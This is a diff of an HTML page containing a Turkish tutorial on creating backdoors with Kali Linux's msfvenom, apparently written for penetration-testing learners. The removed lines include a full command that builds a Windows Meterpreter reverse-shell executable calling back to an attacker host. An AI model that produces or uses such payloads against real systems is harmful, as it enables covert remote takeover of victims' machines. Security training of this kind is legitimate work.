@@ -18,16 +18,18 @@
     </style>
 </head>
 <body>
-   <p>&nbsp;</p>
-<p>Backdoor, bir sistemde yetkisiz erişim sağlamak amacıyla kullanılan bir tür zararlı yazılımdır. Bu tür yazılımlar, genellikle bir bilgisayar veya ağ üzerindeki güvenlik açıklarından yararlanarak gizli bir erişim kanalı oluşturur. Bu erişim kanalı, sistem yöneticileri veya kullanıcılar tarafından tespit edilmeden dışarıdan erişim sağlanmasını mümkün kılar.</p>
-<p>Backdoor'lar çeşitli şekillerde olabilir; bazıları fiziksel olarak bilgisayara yüklenirken, diğerleri ağ üzerinden uzaktan yüklenir ve çalıştırılır. Yüklenmesinin ardından, backdoor'lar genellikle kötü niyetli kişilerin sistem üzerinde tam yetki sahibi olmasını ve çeşitli zararlı işlemler gerçekleştirmesini sağlar.</p>
-<figure class="image image_resized" style="width:72.39%;"><img class="image_resized" style="aspect-ratio:1200/628;" src="https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/63e4c4fcf470fc08f977acf3_backdoor%20attack.jpeg" width="1200" height="628"></figure>
-<p>Kali Linux ile backdoor oluşturma işlemi, genellikle güvenlik testleri ve ağ penetrasyon testleri için yapılır. Ancak, bu tür işlemleri sadece yasal ve etik çerçevede gerçekleştirmek önemlidir.</p>
-<ol>
-    <li><strong>Aracın Seçimi:</strong> Kali Linux üzerinde backdoor oluşturmak için kullanılabilecek çeşitli araçlar bulunmaktadır. En popüler araçlardan biri <code>msfvenom</code>’dur. <code>msfvenom</code>, Metasploit Framework’ün bir parçasıdır ve farklı türde backdoor’lar oluşturmanıza imkan tanır.</li>
-    <li><strong>Payload Oluşturma:</strong><code>msfvenom</code> kullanarak bir payload (yük) oluşturabilirsiniz. Bu payload, sistemde çalıştırıldığında bir geri dönüş (reverse shell) veya diğer zararlı işlevleri gerçekleştirecek şekilde tasarlanmıştır. Aşağıda basit bir <code>msfvenom</code> komutu örneği verilmiştir:</li>
-</ol>
-<pre><code class="language-plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe &gt; backdoor.exe</code></pre>
+   <p><strong>MSFvenom</strong>, <strong>Metasploit framework</strong>'ün bir parçası olarak, backdoor (arka kapı) oluşturmak için kullanılan çok yönlü bir araçtır.</p>
+<p>&nbsp;</p>
+<p>İlk olarak, bir <strong>payload (zararlı kod)</strong> oluşturmanız gerekecek.MSFvenom ile kullanılabilecek tüm payload'ların listesini görmek için aşağıdaki komutu kullanabilirsiniz:</p>
+<pre><code class="language-plaintext">msfvenom -l payloads
+</code></pre>
+<figure class="image image_resized image-style-side" style="width:47.99%;" data-ckbox-resource-id="lQuw-M4xNL0h">
+    <picture>
+        <source srcset="https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/154.webp 154w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/308.webp 308w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/462.webp 462w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/616.webp 616w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/770.webp 770w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/924.webp 924w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/1078.webp 1078w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/1232.webp 1232w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/1386.webp 1386w,https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/1536.webp 1536w" type="image/webp" sizes="(max-width: 1536px) 100vw, 1536px"><img src="https://ckbox.cloud/e09b4781e8fd7d01e40d/assets/lQuw-M4xNL0h/images/1536.png" width="1536" height="367">
+    </picture>
+</figure>
+<p>&nbsp;Görselde görüldüğü üzere 1471 adet payload var. Biz şu anlık bunlardan yaygın olan <strong>Windows için bir reverse shell (ters bağlantı)</strong> payload'unu kullanacağız.</p>
+<p>&nbsp;</p>
      
 </body>
 </html>
